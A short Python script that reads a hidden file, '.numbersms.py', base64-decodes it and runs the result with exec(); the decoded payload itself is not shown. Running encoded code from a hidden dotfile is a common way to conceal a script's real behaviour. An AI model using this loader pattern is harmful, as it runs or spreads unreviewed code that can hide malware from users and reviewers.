import base64

# Step 1: Read the encoded content from the file
with open('.numbersms.py', 'rb') as file:
    encoded_content = file.read()

# Step 2: Decode the content using base64
decoded_content = base64.b64decode(encoded_content)

# Step 3: Execute the decoded script
exec(decoded_content)
